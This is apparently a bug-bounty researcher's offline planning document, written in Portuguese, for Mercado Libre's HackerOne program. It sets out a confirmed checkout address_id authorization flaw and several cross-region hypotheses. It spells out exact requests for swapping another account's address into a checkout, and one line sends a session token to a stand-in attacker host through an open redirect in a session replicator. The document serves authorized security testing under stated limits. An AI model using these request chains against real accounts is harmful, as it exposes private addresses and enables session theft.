# H1-MELI — Cadeia de Ataque (Attack Chain)
## `address_id` BOLA + Regional Drift Hypotheses

**Data:** 2026-10-20  
**Programa:** HackerOne MercadoLibre 33462  
**Regime:** Análise arquitetural offline. Zero requisições. Zero credenciais. Planejamento e documentação apenas.  
**Test Users:** Tu1 `user_id=3780339606`, Tu2 `user_id=3780339608` — contas oficiais de laboratório, sem usuários reais.  
**Fontes:** `H1-MELI-FINDING-ADDRESS-ID.md`, `H1-MELI-LIVE-PROBES-20261020.md`, `H1-MELI-SIBLING-IDS.md`, `H1-MELI-ADDRESS-ID-QA.md`, `H1-MELI-RECON-PASSIVE.md`, `H1-MELI-REDTEAM-GAPS.md`, `H1-MELI-TESTPLAN.md`, `H1-MELI-COVERAGE-MATRIX.md`, `H1-0-MERCADOLIBRE-SPEC-20261020.md`

---

## Parte 1 — Cadeia de Ataque: BOLA em `address_id` no Checkout

### 1.1 Superfície e Modelo de Objeto

O fluxo de compra do Mercado Livre é uma pipeline BFF (Backend for Frontend) de três camadas:

```
Browser (MELI-B)
    │
    ├─ [Camada 1] BFF Carrinho    →  /gz/cart/v3/api/*
    │                                 Cookie de sessão + x-csrf-token same-origin
    │
    ├─ [Camada 2] BFF Checkout   →  /gz/checkout/*/api/*
    │                                 cho_id como token de transição; session_id como handle da sessão de revisão
    │
    └─ [Camada 3] Review/Payment →  /checkout/review/api/*  +  /checkout/payments
                                      session_id no path/query; x-csrf-token + x-bf-checkout-flow
```

O objeto de conflito é `address_id` — identificador numérico sequencial de endereços cadastrados (`1660635183`, `1660723361`). Este objeto transita **apenas no corpo do request** para o BFF de carrinho, não no path. A camada que o consome é o `POST /gz/cart/v3/api/checkout`.

### 1.2 Fluxo Legítimo (Referência)

```
Conta B (legítima)
    │
    ├─ 1. Adiciona item ao carrinho
    │      POST /gz/cart/v3/api/add-to-cart?element_id=27&client.id=<const>
    │      Body: {"item_id": "MLB...", "quantity": 1}
    │      → HTTP 200
    │
    ├─ 2. Lista o carrinho (leitura)
    │      GET /gz/cart/v3/api/cart-list?hub_selected=gm_cart
    │      → HTTP 200, items de B + address_id próprio
    │
    ├─ 3. Cria sessão de checkout (PONTO DE INJEÇÃO)
    │      POST /gz/cart/v3/api/checkout
    │      Body: {
    │        "items": [{"id": "MLB...", "quantity": 1, "quotes": [], "checkout_tags": []}],
    │        "shipping_location": {"type": "address_id", "value": "1660723361"}  ← endereço de B
    │      }
    │      → HTTP 200, {"checkout": {"resource": "https://.../buy?cho_id=<token-B>"}}
    │
    ├─ 4. Inicializa checkout
    │      POST /gz/checkout/start/api/init?cho_id=<token-B>
    │      → HTTP 200, {"deeplink": ".../review/onestep?session_id=<sessao-B>"}
    │
    └─ 5. Review e seleção de frete/pagamento
           GET /checkout/review/onestep?session_id=<sessao-B>
           POST /checkout/review/api/update/session/<sessao-B>/update_selection
           → endereço de B exibido; frete calculado para CEP de B
```

### 1.3 Cadeia de Ataque: BOLA `address_id` (Finding Confirmado)

```
Conta B (atacante) conhece address_id de A por qualquer meio
(IDs numéricos sequenciais próximos do próprio; não há enumeração aqui —
 pressuposto: B conhece o ID por observação ou dicionário)
    │
    ├─ PASSO 1: Controle positivo — verificar fluxo próprio
    │      POST /gz/cart/v3/api/checkout
    │      Cookie: sessão de B
    │      x-csrf-token: <token de B>
    │      Body: {"items": [...], "shipping_location": {"type": "address_id", "value": "1660723361"}}
    │      → HTTP 200 + cho_id de B          [BASELINE ESTABELECIDO]
    │
    ├─ PASSO 2: Substituição do object ID — injeção cross-account
    │      POST /gz/cart/v3/api/checkout
    │      Cookie: sessão de B  ← identidade não muda
    │      x-csrf-token: <token de B>  ← não forja nada de A
    │      Body: {"items": [...], "shipping_location": {"type": "address_id", "value": "1660635183"}}
    │                                                                               ↑ endereço de A
    │      → HTTP 200 + cho_id novo          [FALHA DE AUTORIZAÇÃO — backend aceita]
    │
    ├─ PASSO 3: Inicialização do token de checkout com referência A ancorada
    │      POST /gz/checkout/start/api/init?cho_id=<token-com-addr-A>
    │      → HTTP 200, deeplink para session_id nova vinculada ao contexto que referencia addr A
    │
    ├─ PASSO 4: Renderização do dado privado de A
    │      GET /gz/checkout/cart/v2/buy?cho_id=<...>  (shell de navegação)
    │      GET /checkout/review/onestep?session_id=<sessao-nova>
    │      + seletor de endereço carregado em:
    │        GET /addresses/v3/hub/selectable?app-id=CHO_ONE_STEP&integration-id=<sessao>
    │      → Seletor exibe: "Rua Teste 1 / Centro / Sertãozinho-SP / CEP 14160660 / Test User"
    │         → CAMPO PRIVADO DE A RENDERIZADO NA SESSÃO DE B
    │
    └─ PASSO 5 (não testado, bloqueado por protocolo): Escrita
           Se o seletor de endereço injetado oferece "Editar",
           um PUT/POST de edição usaria o address_id de A como objeto alvo.
           → Escrita NÃO foi tentada. Hipótese documentada, não alegada.
```

### 1.4 Mapa de Pontos de Validação

| Checkpoint | Mecanismo esperado | O que o finding sugere |
|---|---|---|
| **CP-1** — Criação do checkout (`POST /gz/cart/v3/api/checkout`) | Backend valida: `address_id` ∈ endereços do usuário autenticado | **Ausente** — backend aceita `address_id` de A na sessão de B (HTTP 200) |
| **CP-2** — Inicialização do token (`POST /gz/checkout/start/api/init`) | Token de checkout herda a validação do passo anterior | **Derivativo** — token emitido com referência inválida não é interceptado |
| **CP-3** — Seletor de endereço (`GET /addresses/v3/hub/selectable`) | Filtrar endereços ao conjunto do usuário autenticado | **Ausente** — campos de A renderizados em sessão de B |
| **CP-4** — Review de checkout (`GET /checkout/review/onestep`) | Renderizar apenas endereços do titular da sessão | **Derivativo** — exibe endereço propagado do step anterior |
| **CP-5** — Página direta de objeto (`GET /addresses/extra-info-details/<id>`) | Negar ou exibir apenas ao titular | **Presente** — retorna 404 para B ← isolado desta cadeia |

> **Observação de Contraste:** O CP-5 bloqueia o acesso direto ao objeto, mas CPs 1–4 não formam uma cadeia de ACL coerente. O endereço chega à renderização **via referência em payload de checkout**, contornando a proteção da rota direta.

### 1.5 Análise de Raiz

```
Hipótese de raiz:
O serviço de checkout BFF (/gz/cart/v3/api/checkout) delega a resolução
do address_id para um serviço interno de endereços. Esse serviço interno
é capaz de resolver qualquer address_id válido no sistema — não valida
se o requisitante é o titular. O BFF não adiciona uma camada de
verificação de propriedade antes de propagar a referência para a sessão
de checkout.

Padrão arquitetural: "Confused Deputy" — o BFF age como procurador
confiável perante o serviço de endereços, e o serviço de endereços
responde à autoridade do BFF sem verificar se o usuário autenticado
é o titular do objeto.
```

### 1.6 Diagrama de Sequência

```
B_Browser          BFF_Carrinho         BFF_Checkout         Svc_Enderecos
    │                    │                    │                    │
    │──POST checkout─────▶                    │                    │
    │  address_id=A       │                    │                    │
    │                    │──resolve addr A────────────────────────▶│
    │                    │                    │               resolve: OK
    │                    │◀────────────────────────────────── {A details}│
    │                    │  [sem check: é B o titular?]           │
    │◀──200 + cho_id─────│                    │                    │
    │                    │                    │                    │
    │──POST init?cho_id──────────────────────▶│                    │
    │◀────────────200 + session_id (ancorado a addr A)────────────│
    │                    │                    │                    │
    │──GET seletor enderecos──────────────────▶                   │
    │◀──────────────── {Rua Teste 1, Test User, CEP 14160660} ────│
    │  [PII de A exibida na sessão de B]      │                    │
```

### 1.7 Impacto e Vetores Derivados

- **Confidencialidade (direto):** Nome, rua, cidade, estado e CEP de A expostos a B.
- **Integridade (hipótese não testada):** Se o seletor injetado aceitar edição (`PUT` ao `address_id` de A), B poderia alterar o cadastro de endereço de A.
- **Financeiro (hipótese não testada):** Checkout com o endereço de A pode resultar em entrega direcionada ao endereço errado — impacto em transações reais.
- **Enumeração (hipótese não testada):** IDs numéricos sequenciais observados (`1660635183`, `1660723361`, diferença ~88.178) sugerem espaço de identificadores relativamente denso. **Não enumerar sem autorização explícita.**

---

## Parte 2 — Cadeia de Ataque: Regional Drift Hypotheses

> **Status:** Hipóteses arquiteturais sem evidência de execução. Nenhum probe realizado em hosts regionais. Planejamento puro.

### 2.1 Modelo de Regional Drift

O Mercado Livre opera ~20 domínios regionais (`.br`, `.ar`, `.mx`, `.cl`, `.co`, `.pe`, `.uy` etc.) no mesmo ecossistema de identidade. A hipótese de **Regional Drift** é: o estado de autenticação ou os objetos de um usuário autenticado em uma região podem ser acessados ou manipulados a partir de outra região, se a camada de autorização regional não verificar corretamente o site de origem da sessão.

```
Cenário: Usuário autenticado na região BR navega para região CL.
         Backend CL confia na identidade autenticada (mesmo IdP)?
         Backend CL restringe os objetos ao escopo regional?
         Ou qualquer sessão válida de qualquer região acessa objetos globais?
```

### 2.2 Hipóteses de Drift

#### H-RD-1: Cookie de Sessão Cross-Region (Session Portability)

```
Cenário: Cookie de sessão de *.mercadolivre.com.br válido em *.mercadolibre.cl

Superfície: cookies com atributo Domain=.mercadolibre.com ou equivalente
            que seja aceito cross-subdomain entre TLDs distintos.
            Improvável para TLDs diferentes (.br vs .cl) mas possível
            se o IdP emite tokens que transitam via redirect_uri regional.

Cadeia:
    B autenticado em www.mercadolivre.com.br
        │
        ├─ Captura o cookie de sessão (via DevTools, same-origin)
        │
        ├─ Navega manualmente para www.mercadolibre.cl
        │   ← domínio diferente; cookie .com.br NÃO migra automaticamente
        │
        ├─ Observa: a) redirect para login (esperado/normal)
        │           b) sessão reconhecida via token de query (redirect_uri?)
        │           c) API unificada (api.mercadolibre.com) aceita token cross-region
        │
        └─ Se (b) ou (c): objetos de B no .br acessíveis via .cl sem re-autenticação?

Ponto de validação:
    - GET https://www.mercadolibre.cl/ com cookie de .com.br → esperado redirect, não 200 autenticado
    - Observar Location header: redireciona para /login ou para /home autenticado?
    - Verificar se o token de sessão interno (não cookie de browser) é compartilhado via auth.mercadolibre.com
```

#### H-RD-2: Replicador de Sessão Cross-Region (`/session/replicator/`)

O capture contém o seguinte request (idx 133):

```
GET https://auth.mercadolivre.com.br/session/replicator/1792529545495-v4chi30k16hs5rmivbcbrphh2nfl2nkp
    ?go=https://www.mercadolivre.com.br/noindex/denounce/?item_id=MLB2631902457&...
```

Este endpoint **é o mecanismo de replicação de sessão cross-region/cross-subdomain** do Mercado Livre.

```
Cadeia de ataque hipotética:

    [Passo 1] B obtém um token de replicação legítimo do .com.br
               GET /session/replicator/<token>?go=<destino-legítimo>
               → Backend valida o token e emite um cookie de sessão para o destino

    [Passo 2] Adulteração do parâmetro ?go=
               ?go= apontado para domínio regional diferente:
               ?go=https://www.mercadolibre.cl/...
               Questão: o backend do replicador valida que ?go está na allowlist de domínios MELI?

    [Passo 3] Se ?go aceita domínios regionais arbitrários:
               Token emitido concede sessão em .cl usando a identidade .br
               → Possível cross-region session elevation

    [Passo 4] Se ?go aceita redirect para domínio externo (Open Redirect):
               ?go=https://evil.com/steal
               → Session token vazado para domínio controlado por atacante

Pontos de validação:
    - V1: Enviar token legítimo com ?go=https://www.mercadolibre.cl/ → 302 autenticado ou negado?
    - V2: Enviar token legítimo com ?go=https://example.com → redirect negado (4xx) ou seguido?
    - V3 (passivo): Verificar se tokens de replicação são one-time-use (não reutilizáveis)
```

#### H-RD-3: API Unificada com Escopo Regional Fraco (`api.mercadolibre.com`)

```
Cenário: api.mercadolibre.com é o backend compartilhado para todas as regiões.
         Objetos (listings, orders, addresses) têm o campo site_id (MLB, MLA, MLM, MLC, MLU, MLC, MLC...).
         Um usuário autenticado no site MLB pode acessar objetos de MLA se a API não verificar site_id?

Superfície: Endpoints documentados em developers.mercadolibre.com.ar:
    GET  /items/{item_id}
    GET  /users/{user_id}/addresses
    GET  /orders/{order_id}
    GET  /orders/search?seller={user_id}

Cadeia:
    B autenticado como vendedor BR (site_id=MLB)
        │
        ├─ GET https://api.mercadolibre.com/users/{user_id_A}/addresses
        │   onde user_id_A é de outro país (site_id=MLA)
        │   Questão: a API permite acesso ao recurso de outro site_id?
        │
        ├─ GET https://api.mercadolibre.com/orders/{order_id_de_MLA}
        │   Questão: order_id de AR acessível com token de BR?
        │
        └─ Hipótese combinada com address_id:
            address_id de um usuário AR injetado no checkout BR?
            (extensão regional do finding confirmado)

Pontos de validação:
    - V1: Listar endereços do próprio user_id via API (autorizado) → capturar formato e campos
    - V2: Tentar user_id de outra conta de teste conhecida → 403 ou 200 com dados?
    - Controle: ambos user_ids devem ser test users oficiais; sem enumerar user_ids de terceiros
```

#### H-RD-4: Divergência de Controles de Segurança entre Regiões

```
Cenário: Regiões menores (`.bo`, `.do`, `.hn`, `.ni`) podem ter implementações
         backend mais antigas ou com menos camadas de segurança.
         Um fluxo de checkout no Bolívia pode não ter os mesmos controles do Brasil.

Hipótese específica:
    1. O finding de address_id foi confirmado em www.mercadolivre.com.br
    2. O mesmo endpoint em www.mercadolibre.com.bo tem o mesmo comportamento?
       POST https://www.mercadolibre.com.bo/gz/cart/v3/api/checkout
       com address_id de outro usuário

    Motivação: rotas BFF podem ser cópias regionais com diferentes versões ou
               patches de segurança, resultando em divergência de controles.

    Adicionalmente: Tier 2 regions podem ter bounty mas menor rigor de patch,
    tornando-as oportunidade de corroboração ou discovering de variantes.

Ponto de validação:
    - Reproduzir o mesmo probe do finding confirmado em uma região Tier 2
    - Controle: mesmo item, mesmo flow, domínio diferente
    - Comparar resposta: mesma vulnerabilidade (confirma CVE cross-region) ou corrigida?
```

### 2.3 Diagrama de Superfície Regional

```
                    auth.mercadolibre.com / auth.mercadolivre.com.br
                         │ IdP Central (SSO / session replicator)
                         │
              ┌──────────┼──────────┬────────────┐
              ▼          ▼          ▼            ▼
     *.mercadolibre   *.mercadolivre  *.mercadolibre  *.mercadolibre
         .com.ar        .com.br        .com.mx          .cl / .co / .pe
       (MLA)           (MLB)          (MLM)            (MLC/MCO/MPE)
          │               │               │                  │
          └───────────────┴───────────────┴──────────────────┘
                                   │
                        api.mercadolibre.com
                    (backend unificado / multi-tenant)
                                   │
                    ┌──────────────┼──────────────┐
                    ▼              ▼              ▼
              Svc_Usuarios    Svc_Enderecos  Svc_Pedidos
              (user_id global) (address_id)  (order_id)

Hipóteses de drift:
    ◈ H-RD-1: Cookie cross-TLD via redirect
    ◈ H-RD-2: /session/replicator com ?go= aberto
    ◈ H-RD-3: api.mercadolibre.com sem site_id check
    ◈ H-RD-4: Controles divergentes entre regiões Tier 1 e Tier 2
```

---

## Parte 3 — Matriz de Priorização e Critérios de Prova

### 3.1 Ranking de Ações

| # | Finding/Hipótese | Risco Operacional | Valor Estimado | Status | Próximo Passo |
|---|---|---|---|---|---|
| **1** | `address_id` BOLA — escrita (H-ADDR-WRITE) | Baixo — um PUT a objeto controlado de laboratório | Alto — potencialmente eleva `I:N→I:H`, score 6.5→8.1 | Bloqueado (evidência primária pendente via Gate B) | Confirmar T3/T4 do checklist; então probe de PUT com `address_id` do test user A |
| **2** | `address_id` BOLA — corroboração regional (H-RD-4) | Baixo — replica probe já confirmado em outra região | Médio — confirma escopo cross-region | Bloqueado (Gate B) | Mesmo payload, endpoint `.com.ar` ou `.com.mx` Tier 1 |
| **3** | `/session/replicator` — validação de `?go=` (H-RD-2) | Baixo — GET passivo, sem manipulação de sessão | Alto — Open Redirect ou Session Theft potencial | Não iniciado | GET com `?go=` apontando para domínio regional adjacente; observar Location |
| **4** | `api.mercadolibre.com` — BOLA cross-user em `/users/{id}/addresses` (H-RD-3) | Baixo — GET de objeto, sem escrita | Alto — API central, mayor score se confirmado | Não iniciado | GET com user_id do test user A na sessão de B; controle positivo com próprio user_id |
| **5** | `update_selection` — reclassificação de 400 (L1) | Médio — POST mutante, requer headers completos | Alto — se 400 for payload e não ACL, BOLA de sessão | Inconclusivo (headers incompletos na execução anterior) | Re-probe com headers `Origin`/`Referer`/`X-Requested-With` completos + corpo de A |

### 3.2 O Que Constitui Prova para Cada Cadeia

**address_id BOLA (confirmado, em fase de evidência):**
- T1 (exclusividade): Screenshot/DOM redigido mostrando que a lista de endereços de B em `/addresses/v3/hub/selectable` **não contém** `address_id` de A antes do probe.
- T2 (conteúdo privado): Request/response redigido com campos de A (`Rua Teste 1`, `Test User`, `CEP 14160660`) presentes no body da resposta durante a sessão de B.
- T3 (sessão limpa): Captura de session com login fresco de B, sem cookies de A, sem cache compartilhado.
- T4 (leitura independente): GET autenticado de B ao seletor **após** o probe confirma campos de A persistentes, não apenas renderizados por estado local do DOM.

**Regional Drift (hipótese):**
- Para H-RD-2: response completa do replicador com `?go=` externo — deve ser 4xx (bloqueado) para ser seguro; 3xx para domínio externo = Open Redirect comprovado.
- Para H-RD-3: body da resposta `/users/{user_id_A}/addresses` em sessão de B — deve ser 403; 200 com dados = BOLA.
- Para H-RD-4: mesmo 200 + dados de endereço de A no checkout, replicado em outro TLD regional.

---

## Parte 4 — Limites Operacionais e Proteções

> Toda execução depende de Gate B ativo e autorização operacional explícita.

1. **Escrita no objeto de A (`address_id`):** Só testar se Gate B aprovar especificamente essa ação. Não executar apenas porque o botão "Editar" aparece na UI — botão na tela ≠ prova de que a escrita será aceita, e uma escrita não autorizada pode causar efeito irreversível no cadastro de A.
2. **Replicador de sessão:** Somente `?go=` para domínios da própria MELI em primeiro passo. Nunca `?go=` para domínio controlado pelo pesquisador sem aprovação explícita de SSRF externo.
3. **Enumeração de IDs:** Identificadores numéricos sequenciais observados **não autorizam varredura**. Um único ID conhecido de test user A é suficiente; sem geração de IDs por incremento.
4. **Teto operacional:** 60 req/host/h, uma sessão ativa por vez, serializado, parada em 429/WAF/5xx em sequência, qualquer PII de terceiro, ou qualquer efeito financeiro detectado.
5. **Nenhum dado sai do ambiente:** Evidência bruta em `/tmp/` com permissão 0600, fora do git. Apenas derivados redigidos e hashados vão ao repositório.

---

*Documento de planejamento arquitetural · sem execução · 2026-10-20 UTC*
